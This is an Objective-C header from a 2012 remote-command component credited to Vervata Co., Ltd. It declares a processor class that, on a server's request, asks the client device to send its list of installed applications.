/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestInstalledApplicationProcessor
 - Version      :  1.0  
 - Purpose      :  Ask the client to send the installed application to the server
 - Copy right   :  12/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import <Foundation/Foundation.h>
#import "RemoteCmdAsyncHTTPProcessor.h"
#import "ApplicationDelegate.h"

@interface RequestInstalledApplicationProcessor : RemoteCmdAsyncHTTPProcessor <InstalledApplicationDelegate> {

}


//Initialize Processor with RemoteCommandData and RemoteCmdProcessingDelegate;
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate;

@end
